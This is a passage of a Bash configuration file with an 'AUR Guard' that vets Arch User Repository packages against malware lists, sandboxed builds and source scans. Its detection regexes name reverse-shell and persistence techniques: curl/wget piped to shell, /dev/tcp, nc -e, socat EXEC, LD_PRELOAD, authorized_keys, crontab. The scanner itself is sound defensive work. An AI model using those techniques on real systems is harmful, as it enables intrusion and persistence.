# shellcheck shell=bash
# github.com/dillacorn/awtarchy
# ~/.bashrc - User-specific Bash configuration

# Only run if shell is interactive
[[ $- != *i* ]] && return

# --- Aliases ---
# Colorize common commands for better visibility
alias ls='ls --color=auto'
alias grep='grep --color=auto'

# Flatpak alias to always use --user flag on non-Btrfs systems
alias flatpak='flatpak --user'

# Shortcut to launch Hyprland under Wayland session
alias hypr='XDG_SESSION_TYPE=wayland exec start-hyprland'

# --- Environment Variables ---
# Default editor for command line text editing
export EDITOR=/usr/bin/micro

# GTK theme for graphical apps
export GTK_THEME=Materia-dark

# --- Prompt ---
# PS1 defines the command prompt appearance
# \w = full current working directory path
# \$ = shows '#' for root, '$' for normal user
# Icon can be customized, examples: 󰞷 (penguin), , λ, etc.
PS1='󰞷 \w\$ '

# --- Functions ---

# Run a command in the background, redirecting output to a log file
background() {
  if [ $# -lt 1 ]; then
    echo "Usage: background <command> [args...]"
    return 1
  fi

  # Sanitize command name for log filename (replace '/' with '_')
  local cmd_name="${1//\//_}"

  # Run command detached from terminal, log output in ~/.cache/
  nohup "$@" > ~/.cache/"$cmd_name".log 2>&1 < /dev/null &

  echo "$1 started in background. Logs: ~/.cache/$cmd_name.log"
}

dryrun() {
    # Check if file exists and is readable
    if [[ ! -f "$1" || ! -r "$1" ]]; then
        echo -e "\033[1;31m✘ Error: '$1' is not a readable script file\033[0m" >&2
        return 1
    fi

    local script_name
    script_name=$(basename "$1")
    echo -e "\n\033[1;33m🏗️  DRY RUN: \033[1;37m${script_name}\033[0m"

    # Syntax & lint check using ShellCheck
    echo -e "\n\033[1;34m🔎 ShellCheck Analysis:\033[0m"
    if command -v shellcheck >/dev/null 2>&1; then
        if shellcheck "$1"; then
            echo -e "\033[1;32m✓ ShellCheck passed (no issues)\033[0m"
        else
            echo -e "\n\033[1;31m✘ ShellCheck found issues\033[0m" >&2
            return 1
        fi
    else
        echo -e "\033[1;31m✘ ShellCheck is not installed. Install it first:\033[0m"
        echo "  pacman -S shellcheck   # Arch"
        echo "  apt install shellcheck # Debian/Ubuntu"
        return 1
    fi

    # Command analysis with improved detection
    echo -e "\n\033[1;34m📊 Operations Analysis:\033[0m"

    declare -A categories=(
        ["🔧 System Modifications"]='sudo|install|ch(mod|own)|ufw|mount'
        ["📦 Package Management"]='yay|pacman|makepkg|flatpak|dnf|apt'
        ["🗂️  File Operations"]='rm\>|mv\>|cp\>|mkdir|ln\>'
        ["🔄 Git Operations"]='git\s+(clone|push|pull|reset|checkout)'
        ["🌐 Network Operations"]='curl\>|wget\>|ssh\>|scp\>'
    )

    local found_operations=false
    for category in "${!categories[@]}"; do
        local matches
        matches=$(grep -E --color=always -n "${categories[$category]}" "$1")
        if [[ -n "$matches" ]]; then
            found_operations=true
            echo -e "\n\033[1;35m${category}:\033[0m"
            echo "$matches" | while read -r line; do
                echo -e "  \033[1;36mLine ${line%%:*}\033[0m: ${line#*:}"
            done
        fi
    done

    if ! $found_operations; then
        echo -e "\033[1;37mNo potentially impactful operations found\033[0m"
    fi

    echo -e "\n\033[1;33m💡 Dry run complete. To execute:\033[0m\n\033[1;32m./${script_name}\033[0m"
}

# Remove older Awtarchy AUR Guard wrappers if this shell already loaded them.
unset -f yay paru 2>/dev/null

# --- AUR Guard ---
# Safe-by-default AUR workflow for interactive shells.
#
# Normal workflow:
#   sysupdate                 update enabled pacman repository packages
#   aurcheck                  list available AUR updates, emergency blocks, and historical warnings
#   aurverify package         practical packaging and upstream-source verification
#   aurverify --deep package  add exhaustive upstream and dependency-cache scanning
#   aurinstall package             practical clean-root build and install
#   aurinstall --deep package      exhaustive offline build and artifact inspection
#
# Direct read-only yay/paru queries are allowed. Package-changing operations remain blocked.

_AUR_GUARD_ARCH_LIST_URL='https://md.archlinux.org/s/SxbqukK6IA/download'
_AUR_GUARD_GITHUB_REPO='lenucksi/aur-malware-check'
_AUR_GUARD_GITHUB_BRANCH='master'
_AUR_GUARD_GITHUB_MANIFEST_PATH='data/campaigns.json'
_AUR_GUARD_GITHUB_LIST_URL="https://raw.githubusercontent.com/${_AUR_GUARD_GITHUB_REPO}/${_AUR_GUARD_GITHUB_BRANCH}/${_AUR_GUARD_GITHUB_MANIFEST_PATH}"
_AUR_GUARD_GITHUB_ARCHIVE_URL="https://github.com/${_AUR_GUARD_GITHUB_REPO}/archive/refs/heads/${_AUR_GUARD_GITHUB_BRANCH}.tar.gz"
_AUR_GUARD_CACHE_DIR="${XDG_CACHE_HOME:-$HOME/.cache}/awtarchy/aur-guard"
_AUR_GUARD_STATE_DIR="${XDG_STATE_HOME:-$HOME/.local/state}/awtarchy/aur-guard"
_AUR_GUARD_LIST_MAX_AGE=86400
_AUR_GUARD_LIST_MAX_BYTES=2097152
_AUR_GUARD_LIST_MIN_NAMES=100
_AUR_GUARD_GITHUB_ARCHIVE_MAX_BYTES=20971520
_AUR_GUARD_AUR_SCAN_PACKAGE='aur-scanner'
_AUR_GUARD_AUR_SCAN_SIGNING_KEY='25631EAE3F43999050B7D7021132BF893C33FB51'
_AUR_GUARD_AUR_SCAN_KEYSERV='hkps://keyserver.ubuntu.com'

# Exact names that should remain permanently blocked even after historical
# incident records are cleaned or restored. Keep this list intentionally small.
_AUR_GUARD_EMERGENCY_BLOCK_PACKAGES=(
  vesktop-bin-patched
)

_AUR_GUARD_HARD_BLOCK_RE='atomic-lockfile|lockfile-js|js-digest|digest-js|src/hooks/deps|/api/agent|hidden_pids|hidden_names|hidden_inodes|curl[[:space:]][^|;]*\|[[:space:]]*(sh|bash)|wget[[:space:]][^|;]*\|[[:space:]]*(sh|bash)|base64[[:space:]]+(-d|--decode)|/dev/tcp|/dev/udp'
_AUR_GUARD_HOOK_BLOCK_RE='npm[[:space:]]+(install|i|add)|bun[[:space:]]+(install|add|i)|pnpm[[:space:]]+(install|add|i)|yarn[[:space:]]+(install|add)'
_AUR_GUARD_PACKAGE_JSON_BLOCK_RE='"(preinstall|postinstall)"[[:space:]]*:'
_AUR_GUARD_SOURCE_HARD_BLOCK_RE="${_AUR_GUARD_HARD_BLOCK_RE}|\$\([[:space:]]*(curl|wget)[^)]*\)|<\([[:space:]]*(curl|wget)[^)]*\)|(^|[;&|[:space:]])(nc|ncat)[[:space:]][^#]*[[:space:]]-e[[:space:]]|socat[[:space:]].*(EXEC|SYSTEM):|mkfifo[[:space:]].*(nc|ncat)|LD_PRELOAD=.*(/tmp|/dev/shm)|/etc/ld\.so\.preload|\.ssh/authorized_keys|\.config/autostart|systemd/user/|(^|[;&|[:space:]])crontab([[:space:]]|$)"
_AUR_GUARD_SOURCE_DOWNLOAD_RE='(^|[;&|[:space:]])(curl|wget|fetch|aria2c)[[:space:]]'
_AUR_GUARD_SOURCE_EXEC_RE='chmod[[:space:]][^#]*\+x|(^|[;&|[:space:]])(bash|sh|zsh|fish|python3?|perl|ruby|node)[[:space:]][^#]*(/tmp|/dev/shm)|(^|[;&|[:space:]])(eval|source)[[:space:]]|(^|[;&|[:space:]])\.[[:space:]]+[^[:space:]]|(^|[;&|[:space:]])(sudo|pkexec)[[:space:]]'
_AUR_GUARD_SOURCE_SCAN_MAX_BYTES=$((8 * 1024 * 1024))
_AUR_GUARD_SOURCE_SCAN_MAX_FILES=15000
_AUR_GUARD_DEPENDENCY_SCAN_MAX_FILES=200000
_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS=7200
_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS=15
_AUR_GUARD_SANDBOX_MEMORY_MAX='75%'
_AUR_GUARD_SANDBOX_MEMORY_SWAP_MAX='25%'
_AUR_GUARD_SANDBOX_TASKS_MAX=1024
_AUR_GUARD_SANDBOX_FILE_SIZE_MAX=$((16 * 1024 * 1024 * 1024))
_AUR_GUARD_ARTIFACT_MAX_BYTES=$((8 * 1024 * 1024 * 1024))
_AUR_GUARD_ARTIFACT_MAX_FILES=200000
_AUR_GUARD_ICON_THEME_ARTIFACT_MAX_FILES=1000000
_AUR_GUARD_PROGRESS_INTERVAL_SECONDS=10
_AUR_GUARD_PROGRESS_FILE_INTERVAL=5000
_AUR_GUARD_PROGRESS_ENTRY_INTERVAL=25000
_AUR_GUARD_TREE_MAX_BYTES=$((32 * 1024 * 1024 * 1024))
_AUR_GUARD_WORK_PARENT="${AUR_GUARD_WORK_PARENT:-${XDG_CACHE_HOME:-$HOME/.cache}/awtarchy/aur-guard/work}"
_AUR_GUARD_NETWORK_TEST_URL='https://aur.archlinux.org/'
_AUR_GUARD_MODE='practical'
# Awtarchy marks automated AUR Guard children explicitly. Package names are
# never trusted or allowlisted; installer mode only removes duplicate prompts
# after the normal recursive verification, clean build, and artifact checks.
_AUR_GUARD_INSTALLER_MODE=0
[[ ${AWTARCHY_AUR_INSTALLER_MODE:-0} == 1 ]] && _AUR_GUARD_INSTALLER_MODE=1
_AUR_GUARD_COMMIT_RECHECK_ATTEMPTS=3
_AUR_GUARD_COMMIT_RECHECK_DELAY_SECONDS=2
# Informational recent-revision threshold. Maintainer changes remain the hard gate.
AUR_GUARD_RECENT_CHANGE_HOURS="${AUR_GUARD_RECENT_CHANGE_HOURS:-72}"

_aur_guard_is_deep_mode() {
  [[ ${_AUR_GUARD_MODE:-practical} == deep ]]
}

_aur_guard_is_installer_mode() {
  [[ ${_AUR_GUARD_INSTALLER_MODE:-0} == 1 ]]
}

_aur_guard_installer_warnings_are_routine() {
  local key

  _aur_guard_is_installer_mode || return 1
  _aur_guard_has_historical_matches && return 1
  _aur_guard_has_context_warnings || return 1

  for key in "${!_AUR_GUARD_CONTEXT_WARNINGS[@]}"; do
    case "$key" in
      *' package conflict'|*' package replacement')
        ;;
      *)
        return 1
        ;;
    esac
  done

  return 0
}

_aur_guard_pass() {
  local msg="$1"
  printf '\n\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n'
  printf '\033[1;32mPASSED:\033[0m %s\n' "$msg"
  printf '\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n'
}

_aur_guard_fail() {
  local msg="$1"
  printf '\n\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n' >&2
  printf '\033[1;31mFAILED:\033[0m %s\n' "$msg" >&2
  printf '\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n' >&2
}

_aur_guard_progress_heartbeat() {
  local label="$1"
  local started="$2"

  while sleep "$_AUR_GUARD_PROGRESS_INTERVAL_SECONDS"; do
    printf 'AUR Verify: still %s (%d seconds elapsed).\n' \
      "$label" "$((SECONDS - started))" >&2
  done
}

_aur_guard_run_with_progress() {
  local label="$1"
  shift

  local started=$SECONDS
  local heartbeat_fd
  local heartbeat_pid
  local status=0

  printf 'AUR Verify: %s...\n' "$label" >&2

  # Process substitution keeps the heartbeat out of the interactive job table,
  # avoiding noisy "[1] PID" messages while the real command stays foreground.
  exec {heartbeat_fd}< <(_aur_guard_progress_heartbeat "$label" "$started")
  heartbeat_pid=$!

  "$@" || status=$?

  kill "$heartbeat_pid" 2>/dev/null || true
  wait "$heartbeat_pid" 2>/dev/null || true
  exec {heartbeat_fd}<&-

  if (( status == 0 )); then
    printf 'AUR Verify: completed %s in %d seconds.\n' \
      "$label" "$((SECONDS - started))" >&2
  fi

  return "$status"
}

_aur_guard_refuse_install() {
  local pkg="$1"
  local reason="$2"

  printf '\n\033[1;31mAwtarchy refused to install: %s\033[0m\n' "$pkg" >&2
  printf 'Reason: %s\n' "$reason" >&2

  if [[ ${_AUR_GUARD_INSTALL_STARTED:-0} == 1 ]]; then
    printf 'The final pacman transaction started. Inspect /var/log/pacman.log before assuming the host is unchanged.\n' >&2
  else
    printf 'No package was installed.\n' >&2
  fi
}

_aur_guard_pick_helper() {
  local helper

  helper=$(type -P yay 2>/dev/null) && {
    printf '%s\n' "$helper"
    return 0
  }
  helper=$(type -P paru 2>/dev/null) && {
    printf '%s\n' "$helper"
    return 0
  }
  return 1
}

_aur_guard_validate_package_name() {
  local pkg="$1"

  if [[ ! "$pkg" =~ ^[[:alnum:]@_+][[:alnum:]@._+-]*$ ]]; then
    _aur_guard_fail "invalid package name: $pkg"
    return 1
  fi
}

_aur_guard_urlencode() {
  local value="$1"
  command jq -nr --arg value "$value" '$value | @uri'
}

_aur_guard_validate_official_remote() {
  local pkgbase="$1"
  local remote="$2"
  local expected="https://aur.archlinux.org/${pkgbase}.git"

  if [[ "$remote" != "$expected" ]]; then
    _aur_guard_fail "$pkgbase was fetched from an unexpected Git remote: $remote"
    printf 'Expected: %s\n' "$expected" >&2
    return 1
  fi
}

_aur_guard_download() {
  local url="$1"
  local output="$2"
  local output_dir output_name
  local -a command_line

  output_dir=$(dirname -- "$output") || return 1
  output_name=$(basename -- "$output") || return 1
  mkdir -p "$output_dir" || return 1

  case "$output_name" in
    ''|.|..|*/*)
      _aur_guard_fail "invalid download output path: $output"
      return 1
      ;;
  esac

  if type -P curl >/dev/null 2>&1; then
    command_line=(
      /usr/bin/curl
      --fail
      --silent
      --show-error
      --location
      --proto '=https'
      --tlsv1.2
      --connect-timeout 10
      --max-time 45
      --retry 2
      --output "/work/$output_name"
      "$url"
    )
  elif type -P wget >/dev/null 2>&1; then
    command_line=(
      /usr/bin/wget
      --https-only
      --timeout=45
      --tries=3
      --quiet
      --output-document="/work/$output_name"
      "$url"
    )
  else
    return 127
  fi

  _aur_guard_sandbox_exec "$output_dir" allow writable / "${command_line[@]}"
}

_aur_guard_github_campaign_list_paths() {
  local manifest="$1"
  local list_path
  local -a raw_paths=()

  type -P jq >/dev/null 2>&1 || return 127
  mapfile -t raw_paths < <(
    jq -er '
      .campaigns
      | select(type == "array")
      | .[]
      | select(.type == "aur")
      | .lists[]?
      | select(type == "string")
    ' "$manifest"
  )
  (( ${#raw_paths[@]} > 0 )) || return 1

  for list_path in "${raw_paths[@]}"; do
    if [[ ! "$list_path" =~ ^data/campaigns/[A-Za-z0-9._-]+/[A-Za-z0-9._-]+\.txt$ ]]; then
      printf 'AUR Guard: GitHub campaign manifest contains an unsafe list path: %s\n' \
        "$list_path" >&2
      return 1
    fi
  done

  printf '%s\n' "${raw_paths[@]}" | LC_ALL=C sort -u
}

_aur_guard_download_github_package_list() {
  local manifest_url="$1"
  local output="$2"
  local output_dir manifest archive listing archive_manifest archive_root
  local list_path list_url list_file archive_entry archive_size
  local -a list_paths=()

  type -P jq >/dev/null 2>&1 || return 127
  type -P bsdtar >/dev/null 2>&1 || return 127

  output_dir=$(dirname -- "$output") || return 1
  manifest=$(mktemp "$output_dir/github-campaigns.XXXXXX.json") || return 1

  # Current repository layout is campaign-based. Resolve every declared AUR
  # package list from the signed-in-run manifest instead of guessing filenames.
  if _aur_guard_download "$manifest_url" "$manifest" && [[ -s "$manifest" ]]; then
    mapfile -t list_paths < <(_aur_guard_github_campaign_list_paths "$manifest")
    if (( ${#list_paths[@]} > 0 )); then
      : > "$output"
      for list_path in "${list_paths[@]}"; do
        list_url="https://raw.githubusercontent.com/${_AUR_GUARD_GITHUB_REPO}/${_AUR_GUARD_GITHUB_BRANCH}/${list_path}"
        list_file=$(mktemp "$output_dir/github-campaign-list.XXXXXX.txt") || {
          rm -f "$manifest" "$output"
          return 1
        }
        if ! _aur_guard_download "$list_url" "$list_file" || [[ ! -s "$list_file" ]]; then
          rm -f "$manifest" "$list_file" "$output"
          return 1
        fi
        cat "$list_file" >> "$output" || {
          rm -f "$manifest" "$list_file" "$output"
          return 1
        }
        printf '\n' >> "$output"
        rm -f "$list_file"
      done
      rm -f "$manifest"
      printf 'AUR Guard: loaded %d campaign package lists from the GitHub malware mirror.\n' \
        "${#list_paths[@]}" >&2
      return 0
    fi
  fi

  rm -f "$manifest" "$output"

  archive=$(mktemp "$output_dir/github-list-repo.XXXXXX.tar.gz") || return 1
  listing=$(mktemp "$output_dir/github-list-repo.XXXXXX.files") || {
    rm -f "$archive"
    return 1
  }
  archive_manifest=$(mktemp "$output_dir/github-campaigns-archive.XXXXXX.json") || {
    rm -f "$archive" "$listing"
    return 1
  }

  if ! _aur_guard_download "$_AUR_GUARD_GITHUB_ARCHIVE_URL" "$archive" \
      || [[ ! -s "$archive" ]]; then
    rm -f "$archive" "$listing" "$archive_manifest"
    return 1
  fi

  archive_size=$(stat -c %s "$archive" 2>/dev/null) || {
    rm -f "$archive" "$listing" "$archive_manifest"
    return 1
  }
  if (( archive_size > _AUR_GUARD_GITHUB_ARCHIVE_MAX_BYTES )); then
    printf 'AUR Guard: GitHub fallback archive exceeded the %d-byte safety limit.\n' \
      "$_AUR_GUARD_GITHUB_ARCHIVE_MAX_BYTES" >&2
    rm -f "$archive" "$listing" "$archive_manifest"
    return 1
  fi

  if ! /usr/bin/bsdtar -tf "$archive" > "$listing" 2>/dev/null; then
    rm -f "$archive" "$listing" "$archive_manifest"
    return 1
  fi

  mapfile -t archive_entries < <(
    LC_ALL=C grep -E "/${_AUR_GUARD_GITHUB_MANIFEST_PATH//\//\\/}$" "$listing"
  )
  if (( ${#archive_entries[@]} != 1 )); then
    printf 'AUR Guard: GitHub fallback found %d campaign manifests; refusing ambiguous repository data.\n' \
      "${#archive_entries[@]}" >&2
    rm -f "$archive" "$listing" "$archive_manifest"
    return 1
  fi

  archive_entry=${archive_entries[0]}
  archive_root=${archive_entry%/"$_AUR_GUARD_GITHUB_MANIFEST_PATH"}
  if ! /usr/bin/bsdtar -xOf "$archive" "$archive_entry" > "$archive_manifest" 2>/dev/null \
      || [[ ! -s "$archive_manifest" ]]; then
    rm -f "$archive" "$listing" "$archive_manifest"
    return 1
  fi

  mapfile -t list_paths < <(_aur_guard_github_campaign_list_paths "$archive_manifest")
  if (( ${#list_paths[@]} == 0 )); then
    rm -f "$archive" "$listing" "$archive_manifest"
    return 1
  fi

  : > "$output"
  for list_path in "${list_paths[@]}"; do
    archive_entry="$archive_root/$list_path"
    if ! grep -Fqx -- "$archive_entry" "$listing"; then
      rm -f "$archive" "$listing" "$archive_manifest" "$output"
      return 1
    fi
    if ! /usr/bin/bsdtar -xOf "$archive" "$archive_entry" >> "$output" 2>/dev/null; then
      rm -f "$archive" "$listing" "$archive_manifest" "$output"
      return 1
    fi
    printf '\n' >> "$output"
  done

  rm -f "$archive" "$listing" "$archive_manifest"
  printf 'AUR Guard: loaded %d campaign package lists from the GitHub archive fallback.\n' \
    "${#list_paths[@]}" >&2
}

_aur_guard_cache_is_fresh() {
  local file="$1"
  local now mtime

  [[ -s "$file" ]] || return 1
  now=$(date +%s)
  mtime=$(stat -c %Y "$file" 2>/dev/null) || return 1
  (( now - mtime <= _AUR_GUARD_LIST_MAX_AGE ))
}

_aur_guard_normalize_list() {
  local input="$1"
  local output="$2"

  LC_ALL=C tr -cs 'a-z0-9@._+-' '\n' < "$input" \
    | grep -E '^[a-z0-9][a-z0-9@._+-]*$' \
    | LC_ALL=C sort -u > "$output"
}

_aur_guard_update_one_list() {
  local label="$1"
  local url="$2"
  local raw="$3"
  local names="$4"
  local downloader="${5:-_aur_guard_download}"
  local tmp tmp_names size count

  tmp=$(mktemp "${raw}.tmp.XXXXXX") || return 1
  tmp_names=$(mktemp "${names}.tmp.XXXXXX") || {
    rm -f "$tmp"
    return 1
  }

  if "$downloader" "$url" "$tmp" && [[ -s "$tmp" ]]; then
    size=$(stat -c %s "$tmp" 2>/dev/null || printf '0')
    if (( size > 0 && size <= _AUR_GUARD_LIST_MAX_BYTES )); then
      _aur_guard_normalize_list "$tmp" "$tmp_names"
      count=$(wc -l < "$tmp_names")
      if [[ -s "$tmp_names" ]] && (( count >= _AUR_GUARD_LIST_MIN_NAMES )); then
        mv -f "$tmp" "$raw"
        mv -f "$tmp_names" "$names"
        return 0
      fi
    fi
  fi

  rm -f "$tmp" "$tmp_names"

  if _aur_guard_cache_is_fresh "$raw"; then
    tmp_names=$(mktemp "${names}.tmp.XXXXXX") || return 1
    _aur_guard_normalize_list "$raw" "$tmp_names"
    count=$(wc -l < "$tmp_names")
    if [[ -s "$tmp_names" ]] && (( count >= _AUR_GUARD_LIST_MIN_NAMES )); then
      mv -f "$tmp_names" "$names"
      printf 'AUR Guard: %s list download failed or returned invalid data; using cache newer than 24 hours.\n' \
        "$label" >&2
      return 0
    fi
    rm -f "$tmp_names"
  fi

  return 1
}

_aur_guard_refresh_blacklists() {
  local arch_raw arch_names github_raw github_names
  local arch_ok=0 github_ok=0

  mkdir -p "$_AUR_GUARD_CACHE_DIR" || return 1

  arch_raw="$_AUR_GUARD_CACHE_DIR/arch-malware-list.raw"
  arch_names="$_AUR_GUARD_CACHE_DIR/arch-malware-list.names"
  github_raw="$_AUR_GUARD_CACHE_DIR/github-malware-list.raw"
  github_names="$_AUR_GUARD_CACHE_DIR/github-malware-list.names"

  if _aur_guard_update_one_list \
      'official Arch' \
      "$_AUR_GUARD_ARCH_LIST_URL" \
      "$arch_raw" \
      "$arch_names"; then
    arch_ok=1
  else
    printf 'AUR Guard: official Arch malware list unavailable.\n' >&2
  fi

  if _aur_guard_update_one_list \
      'GitHub mirror' \
      "$_AUR_GUARD_GITHUB_LIST_URL" \
      "$github_raw" \
      "$github_names" \
      _aur_guard_download_github_package_list; then
    github_ok=1
  else
    printf 'AUR Guard: GitHub malware-list mirror unavailable.\n' >&2
  fi

  if (( arch_ok == 0 && github_ok == 0 )); then
    _aur_guard_fail 'could not download or use a fresh cached malware package list from either source'
    return 1
  fi
}

declare -A _AUR_GUARD_HISTORICAL_MATCHES=()
declare -A _AUR_GUARD_CONTEXT_WARNINGS=()

_aur_guard_historical_sources() {
  local pkg="$1"
  local found=false

  if [[ -s "$_AUR_GUARD_CACHE_DIR/arch-malware-list.names" ]] \
      && /usr/bin/grep -Fxq -- "$pkg" "$_AUR_GUARD_CACHE_DIR/arch-malware-list.names"; then
    printf 'Arch maintained incident list\n'
    found=true
  fi

  if [[ -s "$_AUR_GUARD_CACHE_DIR/github-malware-list.names" ]] \
      && /usr/bin/grep -Fxq -- "$pkg" "$_AUR_GUARD_CACHE_DIR/github-malware-list.names"; then
    printf 'GitHub aur-malware-check mirror\n'
    found=true
  fi

  $found
}

_aur_guard_emergency_block_source() {
  local pkg="$1"
  local bad

  for bad in "${_AUR_GUARD_EMERGENCY_BLOCK_PACKAGES[@]}"; do
    if [[ "$pkg" == "$bad" ]]; then
      printf 'Awtarchy built-in emergency blocklist\n'
      return 0
    fi
  done

  return 1
}

_aur_guard_check_emergency_block() {
  local pkg="$1"
  local source

  source=$(_aur_guard_emergency_block_source "$pkg") || return 0

  printf '\n\033[1;31mHARD BLOCK MATCH:\033[0m %s\n' "$pkg" >&2
  printf '  - %s\n' "$source" >&2
  return 1
}

_aur_guard_note_historical_match() {
  local pkg="$1"
  local sources

  sources=$(_aur_guard_historical_sources "$pkg") || return 0

  if [[ ! ${_AUR_GUARD_HISTORICAL_MATCHES[$pkg]+set} ]]; then
    _AUR_GUARD_HISTORICAL_MATCHES["$pkg"]="$sources"

    printf '\n\033[1;33mHISTORICAL INCIDENT MATCH:\033[0m %s\n' "$pkg" >&2
    while IFS= read -r source; do
      [[ -n "$source" ]] && printf '  - %s\n' "$source" >&2
    done <<< "$sources"
    printf 'This name was previously reported as affected. That does not prove the current AUR revision is malicious.\n' >&2
    printf 'Awtarchy will continue with enhanced recursive and sandboxed verification.\n' >&2
  fi
}

_aur_guard_has_historical_matches() {
  (( ${#_AUR_GUARD_HISTORICAL_MATCHES[@]} > 0 ))
}

_aur_guard_print_historical_summary() {
  local pkg source

  _aur_guard_has_historical_matches || return 0

  printf '\n\033[1;33mHistorical incident matches in this AUR dependency tree:\033[0m\n' >&2
  while IFS= read -r pkg; do
    printf '  %s\n' "$pkg" >&2
    while IFS= read -r source; do
      [[ -n "$source" ]] && printf '    - %s\n' "$source" >&2
    done <<< "${_AUR_GUARD_HISTORICAL_MATCHES[$pkg]}"
  done < <(printf '%s\n' "${!_AUR_GUARD_HISTORICAL_MATCHES[@]}" | LC_ALL=C sort)
}

_aur_guard_note_context_warning() {
  local key="$1"
  local message="$2"

  if [[ -n ${_AUR_GUARD_CONTEXT_WARNINGS[$key]:-} ]]; then
    case $'\n'"${_AUR_GUARD_CONTEXT_WARNINGS[$key]}"$'\n' in
      *$'\n'"$message"$'\n'*) return 0 ;;
    esac
    _AUR_GUARD_CONTEXT_WARNINGS["$key"]+=$'\n'"$message"
  else
    _AUR_GUARD_CONTEXT_WARNINGS["$key"]="$message"
  fi

  printf '\n\033[1;33mCONTEXT WARNING:\033[0m %s\n' "$key" >&2
  printf '  %s\n' "$message" >&2
}

_aur_guard_has_context_warnings() {
  (( ${#_AUR_GUARD_CONTEXT_WARNINGS[@]} > 0 ))
}

_aur_guard_print_context_summary() {
  local key warning

  _aur_guard_has_context_warnings || return 0

  printf '\n\033[1;33mDependency and source-context warnings:\033[0m\n' >&2
  while IFS= read -r key; do
    printf '  %s\n' "$key" >&2
    while IFS= read -r warning; do
      [[ -n "$warning" ]] && printf '    - %s\n' "$warning" >&2
    done <<< "${_AUR_GUARD_CONTEXT_WARNINGS[$key]}"
  done < <(printf '%s\n' "${!_AUR_GUARD_CONTEXT_WARNINGS[@]}" | LC_ALL=C sort)
}

_aur_guard_has_guarded_matches() {
  _aur_guard_has_historical_matches || _aur_guard_has_context_warnings
}

_aur_guard_confirm_guarded_install() {
  local requested_pkg="$1"
  local answer

  _aur_guard_has_guarded_matches || return 0

  _aur_guard_print_historical_summary
  _aur_guard_print_context_summary

  if _aur_guard_installer_warnings_are_routine; then
    printf '\nAwtarchy installer mode: automatically acknowledging routine package conflict/replacement metadata.\n' >&2
    return 0
  fi

  printf '\nThe exact package revisions passed automated inspection, but the warnings above require manual acknowledgement.\n' >&2
  printf 'Install %s? [y/N]: ' "$requested_pkg" >&2

  if ! IFS= read -r answer; then
    printf '\nCancelled. No package was installed.\n' >&2
    return 1
  fi

  case "$answer" in
    y|Y|yes|YES|Yes)
      return 0
      ;;
    *)
      printf 'Cancelled. No package was installed.\n' >&2
      return 1
      ;;
  esac
}

_aur_guard_has_unsafe_flag() {
  local arg

  for arg in "$@"; do
    case "$arg" in
      --noconfirm|--skipreview|--mflags|--mflags=*|--answerclean*|--answerdiff*|--answeredit*|--skippgpcheck|--skipchecksums|--skipinteg)
        return 0
        ;;
    esac
  done

  return 1
}

_aur_guard_is_mass_update() {
  local arg

  if [[ $# -eq 0 ]]; then
    return 0
  fi

  for arg in "$@"; do
    case "$arg" in
      -Syu|-Syyu|-Syuu|-Syyyu|-Sua|--sysupgrade)
        return 0
        ;;
    esac
  done

  return 1
}

_aur_guard_is_sync_install() {
  local arg

  for arg in "$@"; do
    case "$arg" in
      --sync|-S|-Sy|-Syy|-Syu|-Syyu|-Syuu|-Syyyu|-Sua)
        return 0
        ;;
    esac
  done

  return 1
}

_aur_guard_has_default_install_search() {
  local arg
  local has_mode=false

  for arg in "$@"; do
    case "$arg" in
      -Q*|-G|-P*|-S[silgpcw]*|--query|--getpkgbuild|--show-stats|--search|--info|--list|--groups|--print|--clean|--downloadonly|--help|--version)
        has_mode=true
        ;;
    esac
  done

  $has_mode && return 1
  return 0
}

_aur_guard_is_read_only_helper_command() {
  local arg
  local has_read_only_mode=false

  (( $# > 0 )) || return 1

  for arg in "$@"; do
    case "$arg" in
      -Q*|--query|--query=*|-P*|--show-stats|--help|-h|--version|-V)
        has_read_only_mode=true
        ;;
      -Ss|-Ssq|-Sqs|-Si|-Sii|-Sl|-Sg|-Sp|--search|--info|--list|--groups|--print)
        has_read_only_mode=true
        ;;
      -S*|-R*|-U*|-Y*|--sync|--remove|--upgrade|--sysupgrade|--refresh|--clean|--downloadonly|--gendb|--devel|--combinedupgrade|--noconfirm|--answer*|--mflags*|--save)
        return 1
        ;;
    esac
  done

  $has_read_only_mode
}

_aur_guard_run_helper() {
  local helper="$1"
  shift || true

  if _aur_guard_is_read_only_helper_command "$@"; then
    if ! type -P "$helper" >/dev/null 2>&1; then
      printf '%s is not installed or not in PATH.\n' "$helper" >&2
      return 127
    fi
    command "$helper" "$@"
    return $?
  fi

  _aur_guard_block_message "$helper"
  return 1
}

_aur_guard_block_message() {
  local helper="$1"

  printf '\033[1;31mAUR Guard blocked this %s package transaction.\033[0m\n\n' "$helper"
  printf 'Direct read-only helper queries are allowed, but install, update, remove, and build operations must use AUR Guard.\n\n'
  printf 'Read-only examples:\n'
  printf '  %s -Qiu             inspect installed packages with available upgrades\n' "$helper"
  printf '  %s -Qm              list installed foreign/AUR packages\n' "$helper"
  printf '  %s -Ss package      search packages\n\n' "$helper"
  printf 'Use:\n'
  printf '  aurinstalled         list installed foreign/AUR packages and versions\n'
  printf '  aurremove package    uninstall an installed foreign/AUR package\n'
  printf '  sysupdate            update enabled pacman repo packages\n'
  printf '  aurcheck             show AUR updates, emergency blocks, and historical warnings\n'
  printf '  aurverify package         practical packaging and upstream-source verification\n'
  printf '  aurverify --deep package  exhaustive upstream and dependency-cache scanning\n'
  printf '  aurinstall package             practical clean-root build and install\n'
  printf '  aurinstall --deep package      exhaustive offline build and artifact inspection\n\n'
  printf 'Unsafe manual override:\n'
  printf '  aurunsafe %s [arguments]\n' "$helper"
}

_aur_guard_dependency_name() {
  local dep="$1"
  dep="${dep%%[<>=]*}"
  dep="${dep//[[:space:]]/}"
  printf '%s\n' "$dep"
}

_aur_guard_repo_package_satisfies() {
  local dep_spec="$1"
  local dep_name="$2"
  local candidate_version constraint operator required comparison

  candidate_version=$(command pacman -Si "$dep_name" 2>/dev/null \
    | awk -F ': ' '/^Version/ {print $2; exit}')
  [[ -n "$candidate_version" ]] || return 1

  constraint="${dep_spec#"$dep_name"}"
  [[ -n "$constraint" ]] || return 0

